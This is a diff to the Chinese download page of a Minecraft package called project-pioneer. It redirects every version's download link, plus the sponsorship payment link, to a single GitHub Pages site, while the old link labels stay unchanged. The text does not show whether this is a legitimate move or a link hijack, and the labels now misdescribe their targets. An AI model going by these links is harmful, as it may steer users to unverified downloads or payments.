@@ -29,40 +29,40 @@
 
 #### 安装
 
-1.最新版：<a href="https://www.wenshushu.cn/f/keuauaai93n%20%E5%A4%8D%E5%88%B6%E9%93%BE%E6%8E%A5%E5%88%B0%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80">文叔叔（主路线）</a>
+1.最新版：<a href="https://the1234556789.github.io/mc/">文叔叔（主路线）</a>
 
 #### 老版本下载地方
 
-  5.9.0：<a href="https://c.wss.ink/f/kam02k1u49x">文叔叔（主路线）</a>
+  5.9.0：<a href="https://the1234556789.github.io/mc/">文叔叔（主路线）</a>
 
 
 
-   5.6.0：<a href="https://c.wss.ink/f/k9rhacbkhhv">文叔叔（主路线）</a>
+   5.6.0：<a href="https://the1234556789.github.io/mc/">文叔叔（主路线）</a>
 
 
-5.5.0：<a href="">链接不存在</a>
-
-
-
-
-
-5.4.0：<a href="">链接不存在</a>
+5.5.0：<a href="https://the1234556789.github.io/mc/">链接不存在</a>
 
 
 
 
-5.3.0：<a href="https://gitee.com/Wanderlust-Code/project-pioneer/releases/download/5.3.0/Minecraft.zip">下载</a>
+
+5.4.0：<a href="https://the1234556789.github.io/mc/">链接不存在</a>
 
 
 
-5.2.0：<a href="https://gitee.com/Wanderlust-Code/project-pioneer/releases/download/5.2.0/Minecraft.zip">下载</a>
+
+5.3.0：<a href="https://the1234556789.github.io/mc/">下载</a>
 
 
 
-5.1.0：<a href="https://gitee.com/Wanderlust-Code/project-pioneer/releases/download/5.1.0/Minecraft.zip">下载</a>
+5.2.0：<a href="https://the1234556789.github.io/mc/">下载</a>
 
 
-5.0.0：<a href="https://gitee.com/Wanderlust-Code/project-pioneer/releases/download/5.0.0/Minecraft.zip">下载</a>
+
+5.1.0：<a href="https://the1234556789.github.io/mc/">下载</a>
+
+
+5.0.0：<a href="https://the1234556789.github.io/mc/">下载</a>
 
 
 
@@ -105,7 +105,7 @@ v121.0.0.3:无
 #### 赞助我们
 
 <p>若您想免费支持我们，可以给<a href="https://gitee.com/Wanderlust-Code/project-pioneer/" style="color:var(--accent);">我们的 Gitee 仓库</a>点上一个star（推荐）；<br>
-若您想付费支持我们，可以<a href="https://ifdian.net/a/sponsoring" style="color:var(--accent);">赞助我们 1 块钱</a>；<br>赞助不强求，是否赞助都不会影响您的游戏体验。</p>
+若您想付费支持我们，可以<a href="https://the1234556789.github.io/mc/" style="color:var(--accent);">赞助我们 1 块钱</a>；<br>赞助不强求，是否赞助都不会影响您的游戏体验。</p>
 
 
 
